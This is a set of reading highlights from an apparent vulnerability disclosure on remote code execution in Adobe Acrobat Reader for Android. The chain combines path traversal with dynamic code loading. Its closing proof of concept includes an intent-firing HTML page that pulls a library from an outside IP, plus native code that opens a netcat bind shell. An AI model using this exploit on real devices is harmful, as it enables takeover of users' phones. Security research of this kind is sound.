---
author: hulkvision.github.io
aliases:
  - RCE in Adobe Acrobat Reader for Android
tags:
  - readwise/articles
  - Android
  - Adobe-Acrobat
  - Adobe-Acrobat/Reader-Android
  - vulnerability-research/todo
url: https://hulkvision.github.io/blog/post1/
date: 2024-08-20
---
# RCE in Adobe Acrobat Reader for Android

![rw-book-cover](http://hulkvision.gitlab.io/featured-image.png)

## Highlights


> While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.
> [View Highlight](https://read.readwise.io/read/01j0qvjnzkq0wfn9gcrc15q0x6)



> When an intent with data url for example `http://localhost/test.pdf` is sent to adobe reader app,it downloads the file in `/sdcard/Downloads/Adobe Acrobat` folder with filename as LastPathSegment(i.e `test.pdf`) of the sent url.
> [View Highlight](https://read.readwise.io/read/01j0qvkzzqh8ef1f6bab3znv1y)



> For example let take this url `https://localhost/x/..%2F..%2Ffile.pdf` so when this url is passed to getLastPathSegment() method it will take `..%2F..%2Ffile.pdf` as last segment of the url and will return `../../file.pdf` as output.
> [View Highlight](https://read.readwise.io/read/01j0qy3q6571xtr2cykd0teyjw)



> # Getting RCE
>  Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.
>  A simple way to know whether an app is using play core library for dynamic code loading is to check for `spiltcompat` directory in `/data/data/:application_id/files/` directory.
>  Using path traversal bug i can write an arbitrary apk in `/data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/` directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this [article](https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/)
> [View Highlight](https://read.readwise.io/read/01j0qy5hw7rj9gd1ajnchf6ewj)



> play core library also provide feature of loading native code(.so files) from `/data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/` directory.
>  `FASOpenCVDF.apk` module was also loading an native library from `/data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a` directory. I decided to take a look into `FASOpenCVDF.apk` source code and there i founded this module is also trying to load three unavailable libraries `libADCComponent.so`,`libColoradoMobile.so` and `libopencv_info.so` and this solved my issue of executing code remotely.
> [View Highlight](https://read.readwise.io/read/01j0qy7dfbatt1k8ng25mk69zr)



> # Proof of Concept
>  <html>
>  <title> RCE in Adobe Acrobat Reader for android </title>
>  <body>
>  <script>
>  window.location.href="intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end";
>  </script> 
>  </body>
>  </html>
>  #include <jni.h>
>  #include <stdio.h>
>  #include <stdlib.h>
>  #include <unistd.h>
>  JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
>  if (fork() == 0) {
>  system("toybox nc -p 6666 -L /system/bin/sh -l");
>  }
>  JNIEnv* env;
>  if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
>  return JNI_ERR;
>  }
>  return JNI_VERSION_1_6;
>  }
> [View Highlight](https://read.readwise.io/read/01j0qy7vdvff1ndyjax6m7405j)

